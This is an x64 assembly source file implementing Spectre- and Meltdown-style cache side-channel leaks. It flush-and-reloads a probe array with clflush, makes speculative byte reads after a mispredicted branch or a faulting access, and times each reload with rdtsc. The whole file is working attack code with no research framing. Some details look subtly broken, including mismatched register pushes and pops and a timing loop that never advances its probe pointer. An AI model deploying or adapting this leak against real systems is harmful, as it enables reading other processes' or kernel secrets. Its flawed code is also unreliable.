.code

EXTRN probeArray: QWORD
EXTRN timings:    QWORD
EXTRN pointers:   QWORD
EXTRN controls:   QWORD

PUBLIC _stopspeculate

_leak_branch PROC FRAME
    push rbp
	.pushreg rbp
    mov rbp, rsp
	.setframe rbp, 0

    sub rsp, 20h
	.allocstack 20h
	.endprolog

    push rbx
    push rdi
    push rsi
    push rsp
    push r12
    push r13
    push r14
    push r15

	mov r15, 100
	_read_loop:
		; invalidate L3 cache via clflush
		mov rax, probeArray
		mov r9,  ((1000h * 100h) / 40h) ; 0x100000 byte divided by cacheline size (64byte)
		_cache_invalidate_loop:
			clflush [rax]
			add rax, 40h
			dec r9
			jnz _cache_invalidate_loop

		;mov rax, probeArray
		;mov r9, 100h
		;_probe_prime_loop:
		;	mov r12, [rax]
		;	add rax, 1000h
		;	dec r9
		;	jnz _probe_prime_loop

		mov rbx, probeArray
		mov r10, pointers
		mov r11, controls
		mov r9, 100h
		_speculative_loop:
			xor rax, rax
			mov rcx, qword ptr [r11]
			test rcx, rcx
			jnz _after_speculation      ; almost always not taken

			mov al, byte ptr [r10] ; speculative
_after_speculation:
			shl rax, 0ch
			mov r12, qword ptr [rbx + rax] ; probe

			add r10, 8
			add r11, 8
			dec r9
			jnz _speculative_loop

		mov r10, probeArray
		mov r11, timings
		mov r9, 100h
		_time_probe_loop:
			mfence
			rdtsc
			shl rdx, 32
			or rax, rdx
			mov r12, rax

			mov rax, [r10]
			rdtscp
			mfence

			shl rdx, 32
			or rax, rdx
			mov r13, rax

			sub r13, r12
			mov r14, qword ptr [r11]
			add r14, r13
			mov qword ptr [r11], r14

			add r11, 08h
			add rax, 1000h
			
			dec r9
			jnz _time_probe_loop

		dec r15
		jnz _read_loop

    pop r15
    pop r14
    pop r13
    pop r12
    pop rsp
    pop rsi
    pop rdi
    pop rbp
    pop rbx

    ; restore nonvolatile registers and tear down stackframe
    add rsp, 20h

    ret

_leak_branch ENDP

_leak_exception PROC FRAME
    push rbp
	.pushreg rbp
    mov rbp, rsp
	.setframe rbp, 0

    sub rsp, 20h
	.allocstack 20h
	.endprolog

    push rbx
    push rdi
    push rsi
    push rsp
    push r12
    push r13
    push r14
    push r15

	mov r15, 100
	_read_loop:
		; invalidate L3 cache via clflush
		mov rax, probeArray
		mov r9,  ((1000h * 100h) / 40h) ; 0x100000 byte divided by cacheline size (64byte)
		_cache_invalidate_loop:
			clflush [rax]
			add rax, 40h
			dec r9
			jnz _cache_invalidate_loop

		;mov rax, probeArray
		;mov r9, 100h
		;_probe_prime_loop:
		;	mov r12, [rax]
		;	add rax, 1000h
		;	dec r9
		;	jnz _probe_prime_loop

		mov r10, probeArray
		xor rax, rax
	retry:
		mov al, byte ptr [rcx] ; speculative
		shl rax, 0ch
		mov r12, qword ptr [r10 + rax] ; probe

	_stopspeculate::
		mov r10, probeArray
		mov r11, timings
		mov r9, 100h
		_time_probe_loop:
			mfence
			rdtsc
			shl rdx, 32
			or rax, rdx
			mov r12, rax

			mov rax, [r10]
			rdtscp
			mfence

			shl rdx, 32
			or rax, rdx
			mov r13, rax

			sub r13, r12
			mov r14, qword ptr [r11]
			add r14, r13
			mov qword ptr [r11], r14

			add r11, 08h
			add rax, 1000h
			
			dec r9
			jnz _time_probe_loop

		dec r15
		jnz _read_loop

    pop r15
    pop r14
    pop r13
    pop r12
    pop rsp
    pop rsi
    pop rdi
    pop rbp
    pop rbx

    ; restore nonvolatile registers and tear down stackframe
    add rsp, 20h

    ret
_leak_exception ENDP

END
